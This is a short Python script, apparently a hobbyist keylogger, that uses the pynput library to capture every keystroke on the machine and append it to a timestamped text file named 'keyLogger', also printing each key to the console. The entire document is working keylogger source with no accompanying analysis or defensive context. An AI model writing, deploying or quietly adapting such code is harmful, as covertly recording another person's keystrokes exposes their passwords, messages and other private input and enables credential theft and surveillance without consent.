import datetime
from pynput.keyboard import Listener

d=datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")

def getKey(key):
    key = str(key)
    f=open(f"keyLogger{d}.txt", "a")
    f.write(key.replace("'","").replace("Key.space"," ").replace("Key.backspace","%BORRAR%").replace("Key.enter","\n"))
    print(key)
        
    
with Listener(on_press=getKey) as l:
    l.join()